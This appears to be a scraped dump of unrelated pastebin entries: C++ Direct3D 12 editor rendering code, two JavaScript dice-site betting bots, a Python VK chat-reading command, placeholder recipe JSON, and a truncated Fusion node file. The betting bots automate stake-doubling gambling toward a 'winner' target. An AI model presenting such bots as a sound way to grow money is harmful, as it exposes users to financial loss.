				//ImGui::Image((ImTextureID)(mNativeResolvePass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				if (mAppState->GetViewportState() == Application::ViewportState::LIT_TEXTURED || mAppState->GetViewportState() == Application::ViewportState::LIT)
				{
					//ImGui::Image((ImTextureID)(mLightingSystem->GetShadowMap()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
					ImGui::Image((ImTextureID)(mResolve->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				else
				{
					//ImGui::Image((ImTextureID)(mHiZPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());				
					//ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
					ImGui::Image((ImTextureID)(mResolve->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}

				ImVec2 regionMin = ImGui::GetWindowContentRegionMin();
				ImVec2 regionMax = ImGui::GetWindowContentRegionMax();

				regionWidth = (unsigned int)(regionMax.x - regionMin.x);
				regionHeight = (unsigned int)(regionMax.y - regionMin.y);

				if (regionWidth < 8)
				{
					regionWidth = 8;
				}

				if (regionWidth > 4096)
				{
					regionWidth = 4096;
				}

				if (regionHeight < 8)
				{
					regionHeight = 8;
				}

				if (regionHeight > 4096)
				{
					regionHeight = 4096;
				}
			}
			ImGui::End();

			if (ImGui::Begin(""Debug2""))
			{
				ImGui::Image((ImTextureID)(mRaytracerPassHW->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mLightingSystem->GetShadowMap()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
			}
			ImGui::End();

			if (ImGui::Begin(""Debug3""))
			{
				ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
			}
			ImGui::End();

			if (ImGui::Begin(""Histogram""))
			{
				if (ImPlot::BeginPlot(""Histogram""))
				{
					float data[256];
					for (int i = 0; i < 256; i++)
					{
						data[i] = (float)(mAvgLuminance->GetHistogramHostBuffer()[i]);
					}

					ImPlot::SetupAxisScale(ImAxis_X1, ImPlotScale_Linear);
					ImPlot::SetupAxisLimits(ImAxis_X1, 0.0, 256.0);
					ImPlot::SetupAxisScale(ImAxis_Y1, ImPlotScale_Linear);
					ImPlot::SetupAxisLimits(ImAxis_Y1, 0.0, 1024.0);
					ImPlot::PlotLine(""Buckets"", data, 256);
					ImPlot::EndPlot();
				}
			}
			ImGui::End();

			if (ImGui::Begin(""AverageLuminance""))
			{
				ImGui::LabelText(""Average Luminance"", ""%f"", mAvgLuminance->GetAvgLuminanceHostBuffer()[0]);
			}
			ImGui::End();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Scenegraph"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mEditorScenegraph->ImguiScenegraphEditor();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Edit"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mEditorComponent->ImguiSelectionEditor();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Directory View"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mDirTree->Imgui();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			if (Engine::ComponentStatic::mEditedComponent != nullptr)
			{
				mAppState->mEditorManager->ImguiManagerList<Engine::Texture>(""Select Texture"", mAppState->mAssetManager->GetManager<Engine::Texture>());
			}

			static bool showProfiler = true;
			if (ImGui::Begin(""Profile"", &showProfiler))
			{
				char tmp[255] = { 0 };
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Frame"")); ImGui::LabelText(""Frame"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ShadowPass"")); ImGui::LabelText(""ShadowPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Hi-ZPass1"")); ImGui::LabelText(""Hi-ZPass1"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Hi-ZPass2"")); ImGui::LabelText(""Hi-ZPass2"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""CullPass"")); ImGui::LabelText(""CullPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""CullPassHiZ"")); ImGui::LabelText(""CullPassHiZ"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""DrawPass"")); ImGui::LabelText(""DrawPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ReductionPass"")); ImGui::LabelText(""ReductionPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ResolvePass"")); ImGui::LabelText(""ResolvePass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""NativeResolve"")); ImGui::LabelText(""NativeResolve"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Raytracer::Raygen"")); ImGui::LabelText(""Raytracer::Raygen"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Raytracer::Trace"")); ImGui::LabelText(""Raytracer::Trace"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""DXRPass"")); ImGui::LabelText(""DXRPass"", tmp);
			}
			ImGui::End();

			mImgui->Render();

			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_PRESENT, true);

			mAppState->mGfxProfiler->EndProfile(context, ""Frame"");
			mAppState->mGfxProfiler->Resolve(context);

			mAppState->ReleaseGraphicsContext();

			// Finish recording command list, execute command list and wait for execution
			uint64_t fence = context->Finish();

			if (mAppState->mEditorPreferencesFontFlag)
			{
				mAppState->mEditorPreferencesFontFlag = false;
				mImgui->SetupFonts(mRenderer);
			}

			mAvgLuminance->Readback();

			if (mAppState->mViewportWidth != regionWidth && mAppState->mViewportHeight != regionHeight)
			{
				mAppState->mViewportWidth = regionWidth;
				mAppState->mViewportHeight = regionHeight;

				mWireframePass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mTexturedPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mGBufferPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mNativeResolvePass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mMultisampling->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mResolve->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mLightingPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mRaytracerPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mRaytracerPassHW->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mHiZPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);

				delete mAppState->mRayBuffer;
				mAppState->mRayBuffer = new Raytracer::RayBuffer(mRenderer, mAppState->mViewportWidth * mAppState->mViewportHeight);
			}

			if (mAppState->mBaseSignatureChanged == true)
			{
				mAppState->mBaseSignatureChanged = false;

				delete mAppState->mRenderNodes;
				switch (mAppState->GetViewportState())
				{
				case Application::ViewportState::WIREFRAME:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mWireframePass->GetRootSignature(), nullptr, mHiZPass->GetRootSignature() });
					break;

				case Application::ViewportState::TEXTURED:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature(), nullptr, mHiZPass->GetRootSignature() });
					break;

				case Application::ViewportState::LIT_TEXTURED:
				case Application::ViewportState::LIT:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mGBufferPass->GetRootSignature(), mLightingSystem->GetRootSignature(), mHiZPass->GetRootSignature() });
					break;

				default:
					break;
				}
			}

			mAppState->mGfxProfiler->Process();

			// Swap buffers in swap chain and present to screen
			mSwapChain->SwapBuffers();
		});
	mRenderNode->AddInput(mRaytraceNode);
	mRenderNode->AddInput(mRaytraceHWNode);
	mRenderNode->AddInput(mShadowRenderNode);

	// Add render nodes into pipeline
	mPipeline->AddNode(mRaygenNode);
	mPipeline->AddNode(mRaytraceNode);
	mPipeline->AddNode(mRaytraceHWNode);
	mPipeline->AddNode(mRenderNodesNode);
	mPipeline->AddNode(mMaterialNode);
	mPipeline->AddNode(mShadowRenderNode);
	mPipeline->AddNode(mRenderNode);

	// Register events implemented on this class
	Engine::EventChannel chan(mEventSystem);
	chan.Add<Engine::Window::Resize>(*this);
}


/// <summary>
/// Default virtual destructor
/// </summary>
Renderer::~Renderer()
{
	delete mRenderNode;
	delete mPipeline;
}

/// <summary>
/// Initialize system
/// </summary>
/// <returns>True on success, false otherwise</returns>
bool Renderer::Init()
{
	mImgui = new Engine::RenderPassImgui(mOptions, mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	ImGui::GetStyle().WindowBorderSize = 0;
	ImGui::GetIO().ConfigFlags |= ImGuiConfigFlags_DockingEnable;

	mGBufferPass = new Engine::GBuffer(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mWireframePass = new Engine::RenderPassWireframe(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mTexturedPass = new Engine::RenderPassTextured(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mNativeResolvePass = new Engine::RenderPassResolveNative(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mMultisampling = new Engine::Multisample(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mResolve = new Engine::RenderPassResolveMultisample(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mCulling = new Engine::Culling(mRenderer, mOptions->Get<int>(""Renderer.Culling.MaxBuffers""), mOptions->Get<int>(""Scene.MaxObjects""));
	mLightingSystem = new Engine::LightingSystem(mRenderer, mOptions->Get<int>(""Renderer.Lighting.MaxLights""), mOptions->Get<int>(""Renderer.Lighting.VirtualShadowMapResolution""), mCulling);
	mLightingPass = new Engine::LightingPass(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""), mLightingSystem);
	mRaytracerPass = new Engine::RenderPassRaytracer(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	mHiZPass = new Engine::RenderPassHiZ(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	mRaytracerPassHW = new Engine::RenderPassRaytracerHW(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	mAvgLuminance = new Engine::RenderPassAvgLuminance(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));

	mGizmoPass = new Engine::RenderGizmo(mRenderer, 1024);

	mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature(), mLightingSystem->GetRootSignature(), mHiZPass->GetRootSignature() });

	return true;
}

/// <summary>
/// Shutdown system
/// </summary>
void Renderer::Shutdown()
{
	mRenderer->Flush();


	delete mImgui;

	delete mGBufferPass;
	delete mWireframePass;
	delete mTexturedPass;
	delete mNativeResolvePass;
	delete mMultisampling;
	delete mResolve;
	delete mLightingSystem;
	delete mCulling;
	delete mLightingPass;
	delete mRaytracerPass;
	delete mHiZPass;
	delete mRaytracerPassHW;
	delete mAvgLuminance;

	delete mGizmoPass;
}

/// <summary>
/// Update call on system
/// </summary>
void Renderer::Update()
{
	mPipeline->Update();
}

/// <summary>
/// Window resize
/// </summary>
/// <param name=""r"">Window resize event parameter structure</param>
void Renderer::Handle(const Engine::Window::Resize& r)
{
	// Resize render pass objects bound to window size
	mImgui->Resize(r.mWidth, r.mHeight);
}"
qf8f3PK6,snowybot,coinwalk,JavaScript,Sunday 7th of January 2024 09:53:30 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 24; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = 1;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*lower))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    muck = 0;
    fart = parseFloat(bellance);
}
if ((((base*24)-(botplus*4))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 0;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((bellance-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if ((bellance>=(james*(tens*muck)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"")
alert(""winner winner chicken dinner"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 350);
}
get();"
ktzsSWCj,Untitled,DimaDevelop,Python,Sunday 7th of January 2024 09:49:49 AM CDT,"@without_search_user_default_commands.message(CommandRule(command=[""–ø—Ä–æ—á–∏—Ç–∞—Ç—å"", ""read""]))
async def read_chat_messages(message: Message):
    methods = APIMethod(message)

    if len(message.text.split()) <= 2:
        type_ = PeerType.ALL
    elif message.text.split()[2] == ""–≤—Å–µ"":
        type_ = PeerType.ALL
    elif message.text.split()[2] == ""–±–µ—Å–µ–¥—ã"":
        type_ = PeerType.CHAT
    elif message.text.split()[2] == ""–ª—Å"":
        type_ = PeerType.USER
    elif message.text.split()[2] == ""–≥—Ä—É–ø–ø—ã"":
        type_ = PeerType.GROUP
    else:
        await methods.edit_messages(f""{Icons.WARNING} –£–∫–∞–∂–∏—Ç–µ —Ç–∏–ø —á–∞—Ç–∞."")
        return

    unread_peers = await message.ctx_api.messages.get_conversations(filter=""unread"")

    if not unread_peers.items:
        await methods.edit_messages(f""{Icons.NO} –ù–µ–ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—ã–µ —á–∞—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã."")
        return

    send_message = """"

    if type_ == PeerType.ALL:
        groups = 0
        users = 0
        chats = 0

        for item in unread_peers.items:
            await message.ctx_api.messages.mark_as_read(
                peer_id=item.conversation.peer.id
            )
            if item.conversation.peer.type.value == PeerType.GROUP.value:
                groups += 1
            elif item.conversation.peer.type.value == PeerType.CHAT.value:
                chats += 1
            elif item.conversation.peer.type.value == PeerType.USER.value:
                users += 1

        send_message += (f""{Icons.YES} –í—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—á–∏—Ç–∞–Ω—ã\n""
                         f""{Icons.RIGHT} –í—Å–µ–≥–æ –≥—Ä—É–ø–ø: {groups}\n""
                         f""{Icons.CLEVER} –í—Å–µ–≥–æ –±–µ—Å–µ–¥: {chats}\n""
                         f""{Icons.USERS} –í—Å–µ–≥–æ –ª—Å: {users}."")
    else:
        count = 0
        _type = None

        types = {
            PeerType.GROUP.value: ""–≥—Ä—É–ø–ø–∞—Ö"",
            PeerType.CHAT.value: ""–±–µ—Å–µ–¥–∞—Ö"",
            PeerType.USER.value: ""–ª—Å""
        }

        for item in unread_peers.items:
            if type_.value == item.conversation.peer.type.value:
                _type = item.conversation.peer.type.value
                await message.ctx_api.messages.mark_as_read(
                    peer_id=item.conversation.peer.id
                )
                count += 1

        send_message += (f""{Icons.YES} –£—Å–ø–µ—à–Ω–æ –ø—Ä–æ—á–∏—Ç–∞–ª —Å–æ–æ–±—â–µ–Ω–∏—è –≤ {types[_type]}\n""
                         f""{Icons.CLEVER} –í—Å–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏–π: {count}."")

    await methods.edit_messages(send_message)

"
Q06QJ8gQ,snowybot,coinwalk,JavaScript,Sunday 7th of January 2024 09:32:59 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 240; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = 1;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*lower))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    muck = 0;
    fart = parseFloat(bellance);
}
if ((((botplus*4)-(base*24))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 0;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((bellance-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if ((bellance>=(james*(tens*muck)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"")
alert(""winner winner chicken dinner"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 350);
}
get();"
62etf70C,Recepy Momy (Popular Recipes),AhmadXploit,Dart,Sunday 7th of January 2024 09:11:21 AM CDT,"[
  {
    ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704640152/Recepy%20Momy/images_2_eoig9i.jpg"",
    ""bgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg"",
    ""title"": ""Pasta"",
    ""subtitle"": ""Burn Tomato Pasta"",
    ""score"": ""4.5"",
    ""time"": ""45 mnt"",
    ""from"": ""Italia"",
    ""desc"": ""Lorem ipsum dolor sit amet, constectur adipscing elit, sed do elusmod tempor incidiunt ut labore er dolore magna aliquaaaa"",
    ""foods"": [
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""}
    ],
    ""ingredients"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""dolor sit amet""},
      {""name"": ""teaspond""}
    ],
    ""steps"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""}
    ]
  },
  {
    ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704640180/Recepy%20Momy/images_4_xgdkkd.jpg"",
    ""bgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg"",
    ""title"": ""Fried Chicken"",
    ""subtitle"": ""Indonesia"",
    ""score"": ""4.9"",
    ""time"": ""60 mnt"",
    ""from"": ""Indonesia"",
    ""desc"": ""Lorem ipsum dolor sit amet, constectur adipscing elit, sed do elusmod tempor incidiunt ut labore er dolore magna aliquauuu"",
    ""foods"": [
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""}
    ],
    ""ingredients"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""dolor sit amet""},
      {""name"": ""teaspond""}
    ],
    ""steps"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""}
    ]
  },
  {
    ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704640132/Recepy%20Momy/images_1_mjv2zk.jpg"",
    ""bgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg"",
    ""title"": ""Pizza"",
    ""subtitle"": ""Italia"",
    ""score"": ""4.9"",
    ""time"": ""25 mnt"",
    ""from"": ""Italia"",
    ""desc"": ""Lorem ipsum dolor sit amet, constectur adipscing elit, sed do elusmod tempor incidiunt ut labore er dolore magna aliquaiii"",
    ""foods"": [
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""}
    ],
    ""ingredients"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""dolor sit amet""},
      {""name"": ""teaspond""}
    ],
    ""steps"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""}
    ]
  },
  {
    ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704640117/Recepy%20Momy/images_3_qomgdu.jpg"",
    ""bgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg"",
    ""title"": ""Ayam"",
    ""subtitle"": ""Ayam Penyet"",
    ""score"": ""4.6"",
    ""time"": ""30 mnt"",
    ""from"": ""Indonesia"",
    ""desc"": ""Lorem ipsum dolor sit amet, constectur adipscing elit, sed do elusmod tempor incidiunt ut labore er dolore magna aliquaooo"",
    ""foods"": [
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""},
      {""imagePath"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1704536872/Recepy%20Momy/images_7_xg8sr7.jpg""}
    ],
    ""ingredients"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""dolor sit amet""},
      {""name"": ""teaspond""}
    ],
    ""steps"": [
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""},
      {""name"": ""Lorem Ipsum""}
    ]
  }
]"
ZAAexGgS,Displacement Banner,marcusa3000,Lua,Sunday 7th of January 2024 09:08:58 AM CDT,"{
	Tools = ordered() {
		Background_10 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 248, },
				Width = Input { Value = 484, },
				Height = Input { Value = 760, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.352941185235977, },
				TopLeftGreen = Input { Value = 0.298039227724075, },
				TopLeftBlue = Input { Value = 0.266666680574417, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.5, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
				EffectMask = Input {
					SourceOp = ""Polygon1"",
					Source = ""Mask"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -1265, -1270.5 } },
		},
		Polygon1 = PolylineMask {
			DrawMode = ""InsertAndModify"",
			DrawMode2 = ""InsertAndModify"",
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Polyline = Input {
					SourceOp = ""Polygon1Polyline"",
					Source = ""Value"",
				},
				Polyline2 = Input {
					Value = Polyline {
					},
